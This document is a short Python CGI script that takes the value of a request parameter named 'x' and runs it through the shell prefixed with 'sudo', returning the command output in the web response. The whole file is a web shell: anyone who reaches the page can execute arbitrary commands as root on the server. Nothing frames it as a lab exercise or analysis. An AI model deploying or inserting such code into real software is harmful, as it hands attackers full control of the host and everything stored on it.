#!/usr/bin/python3
import cgi
import subprocess

print("Content-type:text/html")
print()

f = cgi.FieldStorage()
cmd = f.getvalue("x")
output = subprocess.getoutput("sudo " + cmd)
print(output)
